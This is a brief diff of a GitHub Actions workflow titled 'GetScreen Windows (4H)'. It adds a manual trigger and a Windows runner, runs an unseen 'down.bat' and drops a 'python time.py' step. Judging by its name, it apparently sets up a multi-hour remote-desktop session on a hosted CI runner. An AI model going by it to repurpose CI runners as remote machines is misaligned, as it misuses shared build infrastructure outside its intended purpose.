@@ -1,5 +1,12 @@
 name: GetScreen Windows (4H)
 
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
     steps:
       - name: Downloading & Setting Up
         run: |
@@ -8,4 +15,3 @@ name: GetScreen Windows (4H)
          cmd /c down.bat
 
       - name: game Counter
-        run: python time.py
